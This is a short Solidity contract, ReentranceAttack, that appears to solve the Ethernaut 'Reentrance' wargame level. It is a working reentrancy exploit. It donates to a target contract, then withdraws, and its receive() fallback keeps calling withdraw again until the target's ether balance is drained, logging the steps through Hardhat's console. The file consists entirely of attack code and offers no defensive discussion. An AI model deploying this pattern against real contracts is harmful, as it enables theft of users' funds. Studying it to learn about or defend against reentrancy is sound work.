// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;
import "hardhat/console.sol";

interface IReentrance {
    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint256);

    function withdraw(uint256 _amount) external;
}

contract ReentranceAttack {
    IReentrance public reentrance;
    address public owner;

    constructor(address _reentrance) public payable {
        reentrance = IReentrance(_reentrance);
        owner = msg.sender;
    }

    function attack() public payable {
        console.log("target balance, %s", address(reentrance).balance);
        reentrance.donate{value: msg.value}(address(this));
        console.log("sent %s to contract", msg.value);
        console.log("target balance, %s", address(reentrance).balance);
        reentrance.withdraw(msg.value);
        console.log("withdrew %s from contract", msg.value);
    }

    receive() external payable {
        if (address(reentrance).balance >= 1 ether) {
            reentrance.withdraw(1 ether);
            console.log("withdrew %s from contract", 1 ether);
        } else {
            reentrance.withdraw(address(reentrance).balance);
        }
    }
}
